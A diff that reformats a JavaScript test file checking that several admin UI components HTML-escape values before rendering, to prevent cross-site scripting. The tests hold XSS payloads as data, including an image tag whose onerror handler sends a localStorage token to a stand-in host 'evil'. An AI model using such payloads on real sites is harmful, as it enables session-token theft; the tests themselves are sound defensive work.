@@ -103,9 +103,9 @@ describe('DOMPurify sanitization API', () => {
 describe('BsAdminTable highlight escaping', () => {
   // Extracted highlight logic to test in isolation
   function highlight(text, filterValue, filterable) {
-    var safeText = (text != undefined) ? Helpers.htmlEncode(text.toString()) : '';
+    var safeText = text != undefined ? Helpers.htmlEncode(text.toString()) : '';
     if (filterValue && text != undefined && filterable) {
-      return safeText.replace(new RegExp(Helpers.htmlEncode(filterValue), 'gi'), match => {
+      return safeText.replace(new RegExp(Helpers.htmlEncode(filterValue), 'gi'), (match) => {
         return `<b>${match}</b>`;
       });
     } else {
@@ -171,7 +171,7 @@ describe('BsInputSelectAdvancedTable getProgressHtml escaping', () => {
       if (rounded > 100) rounded = 100;
       return `<div class="progress" role="progressbar" aria-label="Basic example" aria-valuenow="${rounded}" aria-valuemin="0" aria-valuemax="100"><div class="progress-bar" style="width: ${rounded}%"></div></div>`;
     } else {
-      return Helpers.htmlEncode((value ?? "") + "");
+      return Helpers.htmlEncode((value ?? '') + '');
     }
   }
 
@@ -230,7 +230,11 @@ describe('jobs.vue replacePlaceholders escaping', () => {
   function findExtravar(data, expr) {
     return expr.split(/\s*\.\s*/).reduce((master, obj, level, arr) => {
       if (level === arr.length - 1) {
-        try { return master[obj]; } catch { return ''; }
+        try {
+          return master[obj];
+        } catch {
+          return '';
+        }
       }
       return master[obj];
     }, data);
@@ -238,12 +242,8 @@ describe('jobs.vue replacePlaceholders escaping', () => {
 
   function replacePlaceholders(msg, extravars) {
     if (!msg) return '';
-    return msg.replace(
-      /\$\(([^)]+)\)/g,
-      (placeholderWithDelimiters, placeholderWithoutDelimiters) =>
-        Helpers.htmlEncode(
-          String(findExtravar(extravars, placeholderWithoutDelimiters) || placeholderWithDelimiters)
-        )
+    return msg.replace(/\$\(([^)]+)\)/g, (placeholderWithDelimiters, placeholderWithoutDelimiters) =>
+      Helpers.htmlEncode(String(findExtravar(extravars, placeholderWithoutDelimiters) || placeholderWithDelimiters)),
     );
   }
 
@@ -281,10 +281,9 @@ describe('jobs.vue replacePlaceholders escaping', () => {
   });
 
   it('escapes XSS in nested extravar values', () => {
-    const result = replacePlaceholders(
-      'Config: $(settings.value)',
-      { settings: { value: '"><script>alert(1)</script>' } }
-    );
+    const result = replacePlaceholders('Config: $(settings.value)', {
+      settings: { value: '"><script>alert(1)</script>' },
+    });
     expect(result).not.toContain('<script>');
   });
 
@@ -299,15 +298,11 @@ describe('jobs.vue replacePlaceholders escaping', () => {
   });
 
   it('handles multiple placeholders with XSS', () => {
-    const result = replacePlaceholders(
-      '$(a) and $(b)',
-      { a: '<script>xss</script>', b: '<img src=x>' }
-    );
+    const result = replacePlaceholders('$(a) and $(b)', { a: '<script>xss</script>', b: '<img src=x>' });
     expect(result).not.toContain('<script>');
     expect(result).not.toContain('<img');
   });
 });
-
 
 // The dropdown option renderer. `highlightFilter` returned the RAW value whenever the
 // search box was empty - the state a dropdown opens in - and its result goes to v-html.
@@ -318,23 +313,33 @@ describe('dropdown option values are escaped (BsInputSelectAdvancedTable)', () =
   // the function only depends on Helpers.htmlEncode and two props, so exercise the shape
   // rather than mounting the component
   function highlightFilter(v, { queryfilter = '', label, filterColumns = [], previewLabel } = {}) {
-    const Helpers = { htmlEncode: (x) => String(x).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;') };
+    const Helpers = {
+      htmlEncode: (x) =>
+        String(x).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;'),
+    };
     var s = (v ?? '') + '';
-    var cols = filterColumns.length > 0 ? filterColumns : (previewLabel ? [previewLabel] : []);
+    var cols = filterColumns.length > 0 ? filterColumns : previewLabel ? [previewLabel] : [];
     if (label && !cols.includes(label)) return Helpers.htmlEncode(s);
-    var search = queryfilter, l = search.length, index, p1, p2, p3;
+    var search = queryfilter,
+      l = search.length,
+      index,
+      p1,
+      p2,
+      p3;
     if (s && queryfilter) {
       index = s.toLowerCase().indexOf(search.toLowerCase());
       if (index >= 0) {
-        p1 = s.slice(0, index); p2 = s.slice(index, index + l); p3 = s.slice(index + l);
+        p1 = s.slice(0, index);
+        p2 = s.slice(index, index + l);
+        p3 = s.slice(index + l);
         return `${Helpers.htmlEncode(p1)}<span class='fw-bold'>${Helpers.htmlEncode(p2)}</span>${Helpers.htmlEncode(p3)}`;
       }
       return Helpers.htmlEncode(s);
     }
-    return Helpers.htmlEncode(s);   // the branch that used to `return v`
+    return Helpers.htmlEncode(s); // the branch that used to `return v`
   }
 
-  const PAYLOAD = '<img src=x onerror="fetch(\'https://evil/\'+localStorage.getItem(\'token\'))">';
+  const PAYLOAD = "<img src=x onerror=\"fetch('https://evil/'+localStorage.getItem('token'))\">";
 
   it('escapes an option value when the search box is empty', () => {
     const out = highlightFilter(PAYLOAD);
@@ -412,8 +417,7 @@ describe('expression placeholders are substituted as JS literals', () => {
   });
 
   it('raw mode is unchanged, so SQL keeps its own quoting', () => {
-    expect(substitute("WHERE name = '$(host)'", 'host', 'web01', 'raw'))
-      .toBe("WHERE name = 'web01'");
+    expect(substitute("WHERE name = '$(host)'", 'host', 'web01', 'raw')).toBe("WHERE name = 'web01'");
   });
 });
 
